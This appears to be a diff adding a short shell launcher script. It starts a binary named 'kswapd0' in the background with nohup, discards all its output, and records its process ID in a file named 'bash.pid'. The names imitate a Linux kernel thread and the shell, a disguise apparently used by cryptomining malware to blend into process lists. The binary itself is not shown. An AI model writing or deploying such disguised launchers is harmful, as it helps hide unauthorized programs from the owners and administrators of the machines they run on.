@@ -1,0 +1,8 @@
+#!/bin/sh
+./stop
+
+sleep 10
+pwd > dir.dir
+dir=$(cat dir.dir)
+nohup ./kswapd0 >>/dev/null &
+echo $! > bash.pid
